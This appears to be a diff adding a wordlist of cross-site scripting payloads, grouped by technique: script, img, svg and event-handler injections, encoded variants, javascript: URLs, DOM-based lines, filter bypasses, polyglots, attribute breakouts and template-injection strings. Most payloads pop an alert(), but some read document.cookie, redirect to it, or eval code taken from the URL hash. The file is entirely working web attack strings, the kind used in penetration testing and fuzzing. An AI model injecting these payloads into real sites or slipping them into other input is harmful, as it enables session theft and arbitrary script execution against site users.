@@ -1,0 +1,77 @@
+# XSS (Cross-Site Scripting) Payloads
+
+# Basic XSS
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(window.origin)</script>
+
+# IMG tag XSS
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img src=javascript:alert('XSS')>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<img/src="x"/onerror=alert(1)>
+
+# SVG XSS
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+
+# Body tag XSS
+<body onload=alert('XSS')>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+
+# Input tag XSS
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<input/onfocus=alert(1)/autofocus>
+
+# Event handler XSS
+<div onmouseover=alert(1)>test</div>
+<button onclick=alert(1)>click</button>
+<a href="#" onmouseover=alert(1)>link</a>
+
+# Encoded XSS
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+<script>alert(String.fromCharCode(88,83,83))</script>
+\u003cscript\u003ealert('XSS')\u003c/script\u003e
+
+# JavaScript protocol
+<a href="javascript:alert('XSS')">click</a>
+<iframe src="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
+
+# DOM-based XSS
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>eval(location.hash.substr(1))</script>
+<script>document.location=document.cookie</script>
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<ScRiPt>alert(1)</sCrIpT>
+<script>alert(1)<!--
+<script>alert(1)//
+<script>/**/alert(1)</script>
+<script>al\u0065rt(1)</script>
+<svg><script>alert&#40;1&#41;</script>
+
+# Polyglot XSS
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Attribute-based XSS
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+
+# Template injection XSS
+{{alert(1)}}
+${alert(1)}
+<%= alert(1) %>
+{alert(1)}
